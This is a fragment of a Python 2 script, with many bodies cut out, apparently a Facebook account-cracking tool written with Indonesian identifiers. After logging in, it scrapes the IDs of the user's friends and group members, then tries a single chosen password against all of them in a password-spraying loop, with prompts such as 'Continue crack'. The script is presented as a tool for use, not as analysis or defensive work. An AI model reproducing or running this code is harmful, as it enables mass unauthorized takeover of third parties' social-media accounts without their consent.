...
if platform.python_version().split('.')[0] != '2':
	cetak('!m[!] You python version 1 %s install python version 2.x.x'%v().split(' ')[0])
	sys.exit()
import cookielib,re,urllib2,urllib,threading
try:
  import mechanize
except ImportError:
	cetak('!m[!] Need install Module !cmechanize!m ...\n!h[!] pip2 install mechanize')
	sys.exit()
br = 0
log = 0
id_bteman = []
...
def crack(d):
	while 1:
		s = inputD('[?] Password')
		if len(s) < 8:
			cetak('!m[!] word password max. 8 !k6')
		else:
			break
	return crack0(d,s)
def tampilhasil(akun,sandi):
	...
	i = inputD('[?] y to try again / t to back menu (y/t)',['Y','T'])
	if i.upper() == 'Y':
...
def crack0(data,sandi):
	akun = []
	cetak('!h[*] all account !k%d want to crack !hwith password !m[!k%s!m]'%(len(data),sandi))
	...
	while 1:
		...
		if v:
			if a.upper() in v:
				...
				cetak('!m[!] Typing correctly boss...')
				continue
		else:
			if len(a) == 0:
				cetak('!m[!] Typing correctly please')
				continue
			else:
				break
	return a
...
def lanjutG():
	global fid_bgroup
	if len(fid_bgroup) != 0:
		i = inputD('[?] r for try again/ l for no, try like before (r/l)',['R','L'])
		if i.upper() == 'L':
...
def login():
	...
	if 'save-device' in url or 'm_sess' in url:
		...
		cetak('!h[*] welcome back !k%s'%nama)
		cetak('!h[*] wish you lucky today...')
		log = 1
	elif 'checkpoint' in url:
		cetak('!m[!] You account need permission\n!k[!]try login with browser')
		keluar()
	else:
		cetak('!m[!] Login failed')
def idgroup():
	if log != 1:
		cetak('!h[*] Login !bFB!h first...')
		login()
		if log == 0:
			keluar()
	...
	while 1:
		...
		try:
			...
			cetak('!m[!] Only scan !h %d id'%len(id_bgroup))
			break
	simpan()
	i = inputD('[?] Continue crack (y/t)',['Y','T'])
	if i.upper() == 'Y':
...
def idteman():
	if log != 1:
		cetak('!h[*] Login !bFB !hfirst to scan you list...')
		login()
		if log == 0:
			keluar()
	cetak('!h[*] loading...')
	...
	try:
		...
		if len(id_teman) != 0:
			cetak('!m[!] Only taking scan !p%d id'%len(id_bteman))
		else:
			cetak('!m[!] Cancel')
			keluar()
	while 1:
		saring_id_teman(buka(next))
		cetak('\r!h[*] !p%s !hid scanned...'%len(id_bteman),1)
		sys.stdout.flush()
		try:
			next = br.find_link(url_regex='friends_center_main').url
		except:
			cetak('\n!m[!] Only scan !p%d id'%len(id_bteman))
			break
	simpan()
	i = inputD('[?] Continue Crack (y/t)',['Y','T'])
	if i.upper() == 'Y':
